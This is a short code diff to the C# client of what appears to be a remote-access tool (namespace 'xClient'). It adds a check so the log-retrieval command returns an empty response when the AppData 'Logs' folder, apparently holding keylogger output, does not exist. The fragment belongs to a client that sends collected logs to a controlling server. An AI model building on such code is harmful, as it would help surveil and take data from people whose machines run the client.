@@ -384,6 +384,12 @@ namespace xClient.Core.Commands
                     int index = 1;
                     string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Logs\\";
 
+                    if (!Directory.Exists(path))
+                    {
+                        new Packets.ClientPackets.GetLogsResponse("", new byte[0], -1, -1, "", index, 0).Execute(client);
+                        return;
+                    }
+
                     FileInfo[] iFiles = new DirectoryInfo(path).GetFiles();
 
                     if (iFiles.Length == 0)
